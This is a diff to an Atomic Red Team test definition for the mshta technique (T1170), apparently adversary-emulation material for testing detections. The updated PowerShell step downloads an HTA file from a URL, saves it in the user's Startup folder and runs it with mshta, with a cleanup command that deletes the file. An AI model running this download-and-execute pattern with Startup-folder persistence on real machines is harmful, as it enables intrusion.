@@ -59,7 +59,16 @@ atomic_tests:
       description: URL to HTA file for execution
       type: string
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+    temp_file:
+      description: temp_file location for hta
+      type: string
+      default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta
   executor:
-    name: command_prompt
+    name: powershell
     command: |
-      mshta #{hta_url}
+      $var =Invoke-WebRequest "#{hta_url}"
+      $var.content|out-file "#{temp_file}"
+      mshta "#{temp_file}"
+    cleanup_command: |  
+      remove-item "#{temp_file}" 
+
